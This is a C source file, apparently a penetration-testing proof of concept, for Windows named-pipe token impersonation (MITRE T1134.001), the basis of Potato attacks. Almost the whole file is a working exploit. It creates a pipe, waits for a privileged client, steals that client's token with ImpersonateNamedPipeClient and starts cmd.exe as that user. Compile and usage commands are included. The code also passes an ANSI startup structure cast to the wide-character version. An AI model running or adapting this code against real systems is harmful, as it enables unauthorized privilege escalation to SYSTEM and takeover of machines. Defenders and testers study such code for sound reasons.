/*
 * Named Pipe Impersonation — Token Theft via ImpersonateNamedPipeClient
 *
 * MITRE ATT&CK: T1134.001 — Token Impersonation/Theft
 * Severity: CRITICAL (if privileged client connects)
 *
 * Technique:
 *   1. Create a named pipe with a name the target app uses (or a generic one)
 *   2. Wait for a privileged process/service to connect
 *   3. Call ImpersonateNamedPipeClient to steal the client's token
 *   4. Use the token to spawn a process (e.g., cmd.exe as SYSTEM)
 *
 * This is the basis for Potato attacks (RottenPotato, JuicyPotato, PrintSpoofer, etc.)
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o pipe_impersonate.exe named_pipe_impersonation.c -ladvapi32
 *   cl named_pipe_impersonation.c /Fe:pipe_impersonate.exe advapi32.lib
 *
 * Usage:
 *   pipe_impersonate.exe [pipe_name]
 *   pipe_impersonate.exe \\.\pipe\VulnAppPipe
 */

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

int main(int argc, char* argv[]) {
    char* pipeName = argc > 1 ? argv[1] : "\\\\.\\pipe\\VAPTPoCPipe";

    printf("[*] Named Pipe Impersonation PoC\n");
    printf("[*] Pipe: %s\n\n", pipeName);

    // Step 1: Create named pipe
    HANDLE hPipe = CreateNamedPipeA(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,      // max instances
        1024,   // out buffer
        1024,   // in buffer
        0,      // default timeout
        NULL    // default security (allows Everyone to connect)
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed (error %lu)\n", GetLastError());
        printf("    Is the pipe name already in use?\n");
        return 1;
    }
    printf("[+] Pipe created. Waiting for connection...\n");
    printf("[*] Trigger the target app/service to connect to this pipe.\n");
    printf("[*] Or from another terminal: echo test > %s\n\n", pipeName);

    // Step 2: Wait for client connection
    BOOL connected = ConnectNamedPipe(hPipe, NULL);
    if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
        printf("[-] ConnectNamedPipe failed (error %lu)\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] Client connected!\n");

    // Read some data to complete the handshake
    char buffer[1024];
    DWORD bytesRead;
    ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
    buffer[bytesRead] = '\0';
    printf("[+] Received %lu bytes: %s\n", bytesRead, buffer);

    // Step 3: Impersonate the client
    if (!ImpersonateNamedPipeClient(hPipe)) {
        printf("[-] ImpersonateNamedPipeClient failed (error %lu)\n", GetLastError());
        printf("    Need SeImpersonatePrivilege (service accounts have it)\n");
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] Impersonation successful!\n");

    // Step 4: Get the impersonated token info
    HANDLE hToken;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
        // Get username
        char tokenUser[256];
        DWORD tokenUserSize = sizeof(tokenUser);
        TOKEN_USER* ptu = (TOKEN_USER*)tokenUser;
        GetTokenInformation(hToken, TokenUser, ptu, tokenUserSize, &tokenUserSize);

        char userName[256], domainName[256];
        DWORD userNameSize = sizeof(userName), domainNameSize = sizeof(domainName);
        SID_NAME_USE sidType;
        LookupAccountSidA(NULL, ptu->User.Sid, userName, &userNameSize,
            domainName, &domainNameSize, &sidType);

        printf("[+] Impersonated: %s\\%s\n", domainName, userName);

        // Step 5: Create process with stolen token
        HANDLE hDupToken;
        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
            SecurityImpersonation, TokenPrimary, &hDupToken)) {

            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;

            // Try to spawn cmd.exe with the impersonated token
            if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
                L"C:\\Windows\\System32\\cmd.exe", NULL,
                CREATE_NEW_CONSOLE, NULL, NULL,
                (LPSTARTUPINFOW)&si, &pi)) {
                printf("[+] Spawned cmd.exe as %s\\%s (PID %lu)\n",
                    domainName, userName, pi.dwProcessId);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                printf("[-] CreateProcessWithTokenW failed (error %lu)\n", GetLastError());
                printf("[*] Trying CreateProcessAsUser...\n");

                if (CreateProcessAsUserA(hDupToken, "C:\\Windows\\System32\\cmd.exe",
                    NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                    NULL, NULL, &si, &pi)) {
                    printf("[+] Spawned cmd.exe (PID %lu)\n", pi.dwProcessId);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                } else {
                    printf("[-] CreateProcessAsUser also failed (error %lu)\n", GetLastError());
                }
            }
            CloseHandle(hDupToken);
        }
        CloseHandle(hToken);
    }

    // Revert impersonation
    RevertToSelf();
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    return 0;
}
